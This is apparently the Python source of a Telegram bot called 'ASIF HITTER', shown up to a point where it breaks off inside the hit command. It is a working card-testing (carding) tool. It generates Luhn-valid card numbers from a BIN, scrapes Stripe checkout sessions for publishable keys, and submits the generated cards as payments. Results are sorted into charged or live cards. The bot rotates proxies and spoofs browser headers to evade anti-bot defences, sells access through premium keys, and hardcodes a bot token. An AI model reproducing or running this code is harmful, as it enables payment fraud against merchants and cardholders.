"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT v3.0 ⚡
Production-Ready | Cloud Optimized | Anti-Bot Protected
Dev: Asif Sakhani (@Asifsakhani786)

Features:
- JSON settings persistence (cloud restart safe)
- Async file I/O with race condition protection
- SOCKS4/SOCKS5 proxy support
- Message pagination for long lists
- TLS fingerprinting & dynamic user-agent rotation
- Admin panel with inline buttons
- Auto-expiry checker

Required: pip install "python-telegram-bot[job-queue]" aiohttp aiohttp-socks aiofiles
"""

import asyncio
import json
import os
import random
import re
import time
import base64
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, Dict, Any

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes
)
from telegram.constants import ParseMode

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8737062520:AAFT0TbyBqg_sipBAoLPdg0sqE8NqKtJP6o"
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# ═══════════════════════════════════════════════════════
# PREMIUM ANIMATED EMOJI IDs
# ═══════════════════════════════════════════════════════

PREMIUM_EMOJI_IDS: Dict[str, str] = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445",
    "📊": "5445146408153806223", "📦": "5303102515301083665",
    "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973",
    "💎": "5343636681473935403", "👋": "5134476056241112076",
    "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125",
    "⭐️": "5172716095697584957", "🆓": "5406756500108501710",
    "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249",
    "🆔": "5447311106030726740", "👤": "5445174334031166029",
    "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381",
    "😱": "5447181973544008180", "🔷": "5258024802010026053",
    "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347",
    "➡️": "5445350109862720603", "🦉": "5123344136665039833",
    "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570",
    "ℹ️": "5289930378885214069", "💀": "5231338559587257737",
    "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304",
    "👇": "5122933683820430249", "📌": "5447187153274567373",
    "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552", "🛒": "5447319442562251569",
    "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737",
    "🛡": "5219672809936006424", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664",
    "🌍": "5303440357428586778", "🔹": "5429436388447655367",
    "📹": "5445158077579952110", "📡": "5447448489149625830",
    "🌟": "5310224206732996002", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "😇": "6321225560789877992",
    "👌": "5445350109862720603", "⭐": "6267298050205553492",
    "🍭": "6267152480878990865", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "📥": "5350747347724810871",
    "💵": "5350711759625795085", "🏷️": "5436285465420383204",
    "📂": "5444908424015934570", "🛠️": "5348239232852836489",
    "📄️": "5323538339062628165", "🗑": "5305652587708572354",
    "🟢": "5444987348334965906", "🔵": "5258024802010026053",
    "🟡": "5343927661213279013", "🔴": "5447647474984449520",
    "❤️": "5287446418909328171", "🤖": "5219943216781995020",
    "🎯": "5444987348334965906", "⚪": "5454245266305604993",
}

# ═══════════════════════════════════════════════════════
# SETTINGS (Cloud Persistent)
# ═══════════════════════════════════════════════════════

SETTINGS_FILE = "settings.json"
SETTINGS_LOCK = asyncio.Lock()

DEFAULT_SETTINGS: Dict[str, Any] = {
    "log_channel": "@your_channel",
    "max_proxies_per_user": 6,
    "max_card_threads": 5,
    "bot_version": "3.0",
}

async def load_settings() -> Dict[str, Any]:
    async with SETTINGS_LOCK:
        try:
            if os.path.exists(SETTINGS_FILE):
                async with aiofiles.open(SETTINGS_FILE, "r") as f:
                    content = await f.read()
                    return json.loads(content)
        except:
            pass
        # Write defaults
        async with aiofiles.open(SETTINGS_FILE, "w") as f:
            await f.write(json.dumps(DEFAULT_SETTINGS, indent=2))
        return DEFAULT_SETTINGS.copy()

async def save_settings(settings: Dict[str, Any]) -> None:
    async with SETTINGS_LOCK:
        async with aiofiles.open(SETTINGS_FILE, "w") as f:
            await f.write(json.dumps(settings, indent=2, default=str))

async def get_setting(key: str, default: Any = None) -> Any:
    settings = await load_settings()
    return settings.get(key, default)

async def update_setting(key: str, value: Any) -> None:
    settings = await load_settings()
    settings[key] = value
    await save_settings(settings)

# ═══════════════════════════════════════════════════════
# EMOJI HELPER
# ═══════════════════════════════════════════════════════

def e(emoji: str) -> str:
    """Convert emoji to premium animated HTML tag"""
    eid = PREMIUM_EMOJI_IDS.get(emoji)
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
    return emoji

def ec(emoji: str, count: int = 1) -> str:
    """Repeat emoji count times"""
    return "".join([e(emoji) for _ in range(count)])

# ═══════════════════════════════════════════════════════
# DATA FILES
# ═══════════════════════════════════════════════════════

DATA_DIR = "data"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"
RESULTS_DIR = f"{DATA_DIR}/results"

# File locks for race condition protection
FILE_LOCKS: Dict[str, asyncio.Lock] = {
    PREMIUM_FILE: asyncio.Lock(),
    PROXY_FILE: asyncio.Lock(),
    KEYS_FILE: asyncio.Lock(),
    SETTINGS_FILE: asyncio.Lock(),
}

# ═══════════════════════════════════════════════════════
# ASYNC JSON HELPERS (Race Condition Safe)
# ═══════════════════════════════════════════════════════

async def jload(filepath: str, default: Any = None) -> Any:
    if default is None:
        default = {}
    lock = FILE_LOCKS.get(filepath, asyncio.Lock())
    async with lock:
        try:
            if os.path.exists(filepath):
                async with aiofiles.open(filepath, "r") as f:
                    content = await f.read()
                    return json.loads(content)
        except:
            pass
        return default

async def jsave(filepath: str, data: Any) -> None:
    os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else ".", exist_ok=True)
    lock = FILE_LOCKS.get(filepath, asyncio.Lock())
    async with lock:
        async with aiofiles.open(filepath, "w") as f:
            await f.write(json.dumps(data, indent=2, default=str))

# ═══════════════════════════════════════════════════════
# PREMIUM SYSTEM
# ═══════════════════════════════════════════════════════

async def is_premium(uid: int) -> bool:
    d = await jload(PREMIUM_FILE, {"users": {}})
    u = d["users"].get(str(uid), {})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry", "2000-01-01")):
                return True
        except:
            pass
    return False

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

# ═══════════════════════════════════════════════════════
# PROXY SYSTEM WITH SOCKS SUPPORT
# ═══════════════════════════════════════════════════════

def detect_proxy_type(pstr: str) -> Tuple[Optional[str], Optional[ProxyType]]:
    """Returns (string_type, aiohttp_socks ProxyType)"""
    p = pstr.strip().lower()
    if p.startswith("http://"):
        return "http", None
    if p.startswith("https://"):
        return "http", None
    if p.startswith("socks4://"):
        return "socks4", ProxyType.SOCKS4
    if p.startswith("socks5://"):
        return "socks5", ProxyType.SOCKS5
    if ":" in p:
        return "http", None
    return None, None

async def check_proxy(proxy: str) -> Tuple[bool, str]:
    """Check proxy against Stripe API — supports HTTP/HTTPS/SOCKS4/SOCKS5"""
    ptype, socks_type = detect_proxy_type(proxy)
    if not ptype:
        return False, "Invalid format"

    try:
        if socks_type:
            # SOCKS proxy
            host_port = proxy.split("://")[1] if "://" in proxy else proxy
            if ":" in host_port:
                host, port = host_port.rsplit(":", 1)
                connector = ProxyConnector(
                    proxy_type=socks_type,
                    host=host,
                    port=int(port),
                    rdns=True
                )
            else:
                return False, "Invalid SOCKS format"
        else:
            # HTTP/HTTPS proxy
            connector = None

        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as session:
            proxy_url = proxy if ptype == "http" and not socks_type else None
            async with session.get(
                "https://api.stripe.com/v1",
                proxy=proxy_url,
                ssl=False
            ) as r:
                return True, str(r.status)
    except Exception as ex:
        return False, str(ex)[:40]

async def get_user_proxies(uid: int) -> list:
    d = await jload(PROXY_FILE, {"users": {}})
    return d["users"].get(str(uid), [])

async def save_user_proxies(uid: int, proxies: list) -> None:
    max_p = await get_setting("max_proxies_per_user", 6)
    d = await jload(PROXY_FILE, {"users": {}})
    d["users"][str(uid)] = proxies[:max_p]
    await jsave(PROXY_FILE, d)

# ═══════════════════════════════════════════════════════
# TLS FINGERPRINTING & DYNAMIC UA ROTATION
# ═══════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
]

SEC_CH_UA_VARIANTS = [
    '"Chromium";v="127", "Not)A;Brand";v="99"',
    '"Google Chrome";v="127", "Chromium";v="127", "Not=A?Brand";v="24"',
    '"Chromium";v="126", "Not)A;Brand";v="99"',
    '"Google Chrome";v="126", "Chromium";v="126", "Not=A?Brand";v="24"',
]

PLATFORMS = ['"Windows"', '"macOS"', '"Linux"']

def get_tls_headers(referer: str = "https://checkout.stripe.com/") -> Dict[str, str]:
    """Generate realistic browser headers with TLS fingerprinting"""
    ua = random.choice(USER_AGENTS)
    sec_ch_ua = random.choice(SEC_CH_UA_VARIANTS)
    platform = random.choice(PLATFORMS)
    
    return {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://checkout.stripe.com",
        "referer": referer,
        "user-agent": ua,
        "sec-ch-ua": sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": platform,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "cache-control": "no-cache",
        "pragma": "no-cache",
    }

# ═══════════════════════════════════════════════════════
# MESSAGE PAGINATION HELPER
# ═══════════════════════════════════════════════════════

MAX_TG_MSG_LENGTH = 4096

async def send_paginated(update: Update, text: str, parse_mode: str = ParseMode.HTML) -> None:
    """Send message in chunks if it exceeds Telegram's 4096 char limit"""
    if len(text) <= MAX_TG_MSG_LENGTH:
        await update.message.reply_text(text, parse_mode=parse_mode)
        return
    
    # Split into pages
    pages = []
    current = ""
    for line in text.split("\n"):
        if len(current) + len(line) + 1 > MAX_TG_MSG_LENGTH:
            pages.append(current)
            current = line
        else:
            current += "\n" + line if current else line
    if current:
        pages.append(current)
    
    for i, page in enumerate(pages):
        header = f"{e('📄️')} <b>Page {i+1}/{len(pages)}</b>\n\n"
        await update.message.reply_text(header + page, parse_mode=parse_mode)

# ═══════════════════════════════════════════════════════
# CARD GENERATOR
# ═══════════════════════════════════════════════════════

def luhn(partial: str) -> str:
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) 
                for i,c in enumerate(t[::-1]))
        if s%10==0: return str(d)
    return "0"

def card_len(bin_: str) -> int:
    p2, p3 = bin_[:2], bin_[:3]
    if p2 in ("34","37"): return 15
    if p2 in ("30","36","38") or p3 in ("300","305"): return 14
    return 16

def gen_card(bin_str: str) -> dict:
    parts = bin_str.strip().split("|")
    raw = re.sub(r"[^0-9xX]", "", parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = card_len(c)
    if len(c) >= ln: c = c[:ln-1]
    while len(c) < ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year
    mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if card_len(raw) == 15 and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc": c, "mo": mm, "yr": yy, "cv": cvv, "f": f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════════════════════════════════
# STRIPE CHECKER WITH SOCKS + TLS SUPPORT
# ═══════════════════════════════════════════════════════

class StripeChecker:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy = proxy
        self.proxy_type = None
        self.socks_type = None
        self.pk = self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.chk = ""
        self.sub = 0
        self.cname = "John Smith"
        self.cemail = "john@example.com"
        self.cc = "US"; self.cl1 = "476 West White Mountain Blvd"
        self.ccity = "Pinetop"; self.cst = "AZ"; self.czip = "85929"
        self.muid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        self.sid = f"{random.getrandbits(32):08x}"
        self.guid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        
        # Parse proxy
        if proxy:
            self.proxy_type, self.socks_type = detect_proxy_type(proxy)

    def _get_connector(self):
        """Get appropriate connector based on proxy type"""
        if self.socks_type and self.proxy:
            hp = self.proxy.split("://")[1] if "://" in self.proxy else self.proxy
            if ":" in hp:
                host, port = hp.rsplit(":", 1)
                return ProxyConnector(
                    proxy_type=self.socks_type,
                    host=host,
                    port=int(port),
                    rdns=True
                )
        return None

    def _get_proxy_url(self):
        """Get proxy URL for HTTP/HTTPS proxies"""
        if self.proxy_type == "http" and not self.socks_type:
            return self.proxy
        return None

    def _decode(self):
        m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
        if m: self.cs = m.group(0)
        if '#' in self.url:
            try:
                hp = self.url.split('#')[1]
                dc = base64.b64decode(unquote(hp))
                xr = ''.join(chr(b^5) for b in dc)
                m2 = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xr)
                if m2: self.pk = m2.group(0)
            except: pass

    async def init(self) -> bool:
        self._decode()
        
        connector = self._get_connector()
        proxy_url = self._get_proxy_url()
        
        if not self.pk or not self.cs:
            try:
                timeout = aiohttp.ClientTimeout(total=15)
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=timeout
                ) as s:
                    hdrs = get_tls_headers()
                    async with s.get(self.url, headers=hdrs, proxy=proxy_url, ssl=False) as r:
                        h = await r.text()
                        if not self.cs:
                            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.cs = m.group(0)
                        if not self.pk:
                            m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.pk = m.group(0)
            except: pass
        
        if not self.cs or not self.pk:
            return False
        
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            ) as s:
                hdrs = get_tls_headers()
                hdrs["Authorization"] = f"Bearer {self.pk}"
                
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=hdrs,
                    data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=proxy_url,
                    ssl=False
                ) as r:
                    d = await r.json()
        except:
            return False
        
        if "error" in d:
            return False
        
        ac = d.get("account_settings") or {}
        self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
        lg = d.get("line_item_group") or {}
        iv = d.get("invoice") or {}
        pi = d.get("payment_intent") or {}
        am = lg.get("total",0) or iv.get("total",0) or pi.get("amount",0)
        cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
        self.amt_raw = am
        self.amt = f"${am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "Trial/$0")
        self.chk = d.get("init_checksum","")
        self.sub = lg.get("subtotal",0) if lg else am
        
        cu2 = d.get("customer") or {}
        ad = cu2.get("address") if cu2 else {}
        ad = ad or {}
        self.cname = cu2.get("name") or "John Smith"
        self.cemail = d.get("customer_email") or f"john{random.randint(100,999)}@gmail.com"
        self.cc = ad.get("country") or "US"
        self.cl1 = ad.get("line1") or "476 West White Mountain Blvd"
        self.ccity = ad.get("city") or "Pinetop"
        self.cst = ad.get("state") or "AZ"
        self.czip = ad.get("postal_code") or "85929"
        return True

    async def charge(self, card: dict) -> dict:
        res = {"card": card["f"], "st": "ERROR", "msg": "Unknown"}
        
        connector = self._get_connector()
        proxy_url = self._get_proxy_url()
        
        try:
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            ) as s:
                hdrs = get_tls_headers()
                hdrs["Authorization"] = f"Bearer {self.pk}"
                
                pmb = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                    f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                    f"&billing_details[name]={quote(self.cname)}&billing_details[email]={quote(self.cemail)}"
                    f"&billing_details[address][country]={self.cc}&billing_details[address][line1]={quote(self.cl1)}"
                    f"&billing_details[address][city]={quote(self.ccity)}&billing_details[address][postal_code]={self.czip}"
                    f"&billing_details[address][state]={self.cst}&key={self.pk}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                    f"&payment_user_agent={quote('stripe.js/f5e714652c')}"
                    f"&time_on_page={random.randint(25000,55000)}&pasted_fields={quote('number')}"
                )
                
                async with s.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=hdrs, data=pmb, proxy=proxy_url, ssl=False
                ) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    cd = pm["error"].get("decline_code","")
                    mg = pm["error"].get("message","")
                    if cd in ("incorrect_cvc","insufficient_funds") or any(x in mg.lower() for x in ("cvc","cvv","security code")):
                        res["st"], res["msg"] = "LIVE", "CVC MATCH" if "cvc" in mg.lower() else "INSUFFICIENT FUNDS"
                    else:
                        res["st"], res["msg"] = "DECLINED", mg[:80]
                    return res
                
                pmid = pm.get("id")
                if not pmid: return res
                
                cfb = (
                    f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                    f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={self.pk}"
                    f"&init_checksum={quote(self.chk)}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                )
                
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                    headers=hdrs, data=cfb, proxy=proxy_url, ssl=False
                ) as r:
                    cf = await r.json()
                
                if "error" in cf:
                    er = cf["error"]
                    cd = er.get("decline_code","")
                    mg = er.get("message","")
                    if "captcha" in mg.lower(): res["st"], res["msg"] = "HCAPTCHA", "Captcha"
                    elif cd in ("challenge_required","require_action"): res["st"], res["msg"] = "3DS", "3DS Required"
                    elif cd in ("incorrect_cvc","insufficient_funds"): res["st"], res["msg"] = "LIVE", cd
                    else: res["st"], res["msg"] = "DECLINED", mg[:80]
                else:
                    pi2 = cf.get("payment_intent") or {}
                    st2 = pi2.get("status","") or cf.get("status","")
                    if st2 == "succeeded": res["st"], res["msg"] = "CHARGED", "PAYMENT SUCCESSFUL!"
                    elif st2 == "requires_action": res["st"], res["msg"] = "3DS", "3DS Required"
                    else: res["st"], res["msg"] = "ERROR", st2
        except Exception as ex:
            res["msg"] = str(ex)[:60]
        return res

# ═══════════════════════════════════════════════════════
# HTML ESCAPE
# ═══════════════════════════════════════════════════════

def h(text: str) -> str:
    """Escape text for HTML parse mode"""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ═══════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    prem = await is_premium(uid)
    adm = is_admin(uid)
    
    if adm:
        badge = f"{e('⚡')} {e('👑')} ADMIN"
    elif prem:
        badge = f"{e('👑')} PREMIUM"
    else:
        badge = f"{e('⛔')} FREE"
    
    kb = [
        [InlineKeyboardButton("🌐 Gateway Check", callback_data="gate_help")],
        [InlineKeyboardButton("💳 Hit Checkout", callback_data="hit_help")],
        [InlineKeyboardButton("🔐 Proxy Manager", callback_data="proxy_menu")],
        [InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_help")],
        [InlineKeyboardButton("👤 My Status", callback_data="status")],
    ]
    if adm:
        kb.append([InlineKeyboardButton("⚡ Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton(f"❤️ Dev: {DEV_NAME}", url=f"https://t.me/{DEV_USERNAME}")])
    
    txt = f"""
{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

{e('🤖')} <b>Status:</b> {badge}
{e('💎')} <b>Version:</b> v{await get_setting('bot_version', '3.0')}

{e('⭐️')} <b>Commands:</b>
{e('🌐')} /gate — Check gateway info
{e('💳')} /hit — Hit checkout (Premium)
{e('🔐')} /addproxy — Add proxies
{e('🔍')} /proxy — Check proxy status
{e('🗑')} /rmproxy — Remove proxies
{e('🔑')} /auth — Redeem premium key
{e('👤')} /status — Premium status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════ PROXY ═══════════════

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message
    
    content = ""
    if msg.document:
        f = await msg.document.get_file()
        fb = await f.download_as_bytearray()
        content = fb.decode("utf-8", errors="ignore")
    elif msg.text:
        content = msg.text.replace("/addproxy", "").strip()
    else:
        await msg.reply_text(f"{e('❌')} Send proxy list or .txt file", parse_mode=ParseMode.HTML)
        return
    
    lines = [l.strip() for l in content.split("\n") if l.strip()]
    if not lines:
        await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
        return
    
    current = await get_user_proxies(uid)
    max_p = await get_setting("max_proxies_per_user", 6)
    slots_left = max_p - len(current)
    if slots_left <= 0:
        await msg.reply_text(f"{e('⛔')} Proxy limit reached! ({max_p} max)\nUse /rmproxy first", parse_mode=ParseMode.HTML)
        return
    
    st = await msg.reply_text(f"{e('⏳')} Checking proxies...", parse_mode=ParseMode.HTML)
    added = 0
    
    for pline in lines[:slots_left*2]:
        if added >= slots_left: break
        ptype, _ = detect_proxy_type(pline)
        if not ptype: continue
        live, _ = await check_proxy(pline)
        if live:
            pkey = pline if "://" in pline else f"{ptype}://{pline}"
            if pkey not in current:
                current.append(pkey)
                added += 1
    
    await save_user_proxies(uid, current)
    
    await st.edit_text(
        f"{e('✅')} <b>Proxies Added!</b>\n\n"
        f"{e('📦')} Added: <b>{added}</b>\n"
        f"{e('📊')} Total: <b>{len(current)}/{max_p}</b>\n"
        f"{e('💠')} Slots left: <b>{max_p-len(current)}</b>",
        parse_mode=ParseMode.HTML
    )

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    proxies = await get_user_proxies(uid)
    
    if not proxies:
        await update.message.reply_text(f"{e('❌')} No proxies saved. Use /addproxy", parse_mode=ParseMode.HTML)
        return
    
    st = await update.message.reply_text(f"{e('⏳')} Checking all proxies...", parse_mode=ParseMode.HTML)
    result = []
    live_c = 0
    
    for p in proxies:
        is_live, info = await check_proxy(p)
        status = f"{e('✅')} LIVE" if is_live else f"{e('❌')} DEAD"
        if is_live: live_c += 1
        result.append(f"{status} | <code>{h(p[:40])}</code> | {h(info)}")
    
    txt = f"{e('📡')} <b>PROXY STATUS</b>\n\n"
    txt += f"{e('💠')} Live: <b>{live_c}</b> | Dead: <b>{len(proxies)-live_c}</b> | Total: <b>{len(proxies)}</b>\n\n"
    txt += "\n".join(result)
    
    # Use pagination if needed
    await send_paginated(update, txt)

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    current = await get_user_proxies(uid)
    
    if not current:
        await update.message.reply_text(f"{e('❌')} No proxies to remove", parse_mode=ParseMode.HTML)
        return
    
    if ctx.args:
        arg = ctx.args[0]
        if arg.lower() == "all":
            await save_user_proxies(uid, [])
            await update.message.reply_text(f"{e('✅')} All proxies removed!", parse_mode=ParseMode.HTML)
            return
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(current):
                removed = current.pop(idx)
                await save_user_proxies(uid, current)
                await update.message.reply_text(f"{e('✅')} Removed: <code>{h(removed[:50])}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"{e('❌')} Invalid number", parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(f"{e('❌')} Invalid number", parse_mode=ParseMode.HTML)
    else:
        txt = f"{e('🗑')} <b>REMOVE PROXY</b>\n\nSelect number:\n\n"
        for i, p in enumerate(current, 1):
            txt += f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
        txt += f"\n{e('ℹ️')} Usage: <code>/rmproxy 1</code> or <code>/rmproxy all</code>"
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

# ═══════════════ GATEWAY ═══════════════

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    url = ctx.args[0]
    uid = update.effective_user.id
    proxies = await get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('⏳')} Fetching gateway...", parse_mode=ParseMode.HTML)
    
    ck = StripeChecker(url, proxy)
    ok = await ck.init()
    
    if ok:
        await st.edit_text(
            f"{e('🌐')} <b>GATEWAY INFO</b>\n\n"
            f"{e('📦')} Merchant: <b>{h(ck.mer)}</b>\n"
            f"{e('💰')} Amount: <b>{h(ck.amt)}</b>\n"
            f"{e('🔑')} PK: <code>{h(ck.pk[:25])}...</code>\n"
            f"{e('🔗')} CS: <code>{h(ck.cs[:25])}...</code>\n\n"
            f"{e('✅')} Gateway is LIVE",
            parse_mode=ParseMode.HTML
        )
    else:
        await st.edit_text(f"{e('❌')} Failed to fetch gateway", parse_mode=ParseMode.HTML)

# ═══════════════ HIT ═══════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if not await is_premium(uid) and not adm:
        await update.message.reply_text(
            f"{e('🚫')} <b>ACCESS DENIED</b>\n\n"
            f"{e('⛔')} Premium feature!\n"
            f"{e('🔑')} Use /auth &lt;key&gt; to activate\n"
            f"{e('👤')} Contact: <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{e('⚠️')} Usage: <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n"
            f"{e('💳')} Example: <code>/hit https://... 37936303</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = ctx.args[0]
    bin_in = ctx.args[1]
    
    proxies = await get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
    
    ck = StripeChecker(url, proxy)
    if not await ck.init():
        await st.edit_text(f"{e('❌')} Failed to init session", parse_mode=ParseMode.HTML)
        return
    
    cards = [gen_card(bin_in) for _ in range(10)]
    
    res = {"CHARGED": 0, "LIVE": 0, "3DS": 0, "DECLINED": 0, "HCAPTCHA": 0, "ERROR": 0}
    charged_c, live_c = [], []
    
    for i, card in enumerate(cards):
        att_text = f"""
{e('🚀')} <b>ASIF HITTER</b> {e('💳')}

{e('📦')} Merchant: <b>{h(ck.mer)}</b>
{e('💰')} Amount: <b>{h(ck.amt)}</b>
{e('💳')} BIN: <code>{bin_in[:8]}xxxx</code>

{e('⏳')} Attempt: <b>{i+1}/10</b>
{e('🎯')} Card: <code>{card['cc'][:6]}xxxxxx{card['cc'][-4:]}</code>

{e('📊')} {e('🟢')}: <b>{res['CHARGED']}</b> {e('🔵')}: <b>{res['LIVE']}</b> 🟡: <b>{res['3DS']}</b> 🔴: <b>{res['DECLINED']}</b>
"""
        try:
            await st.edit_text(att_text, parse_mode=ParseMode.HTML)
        except: pass
        
        r = await ck.charge(card)
        sts = r["st"]
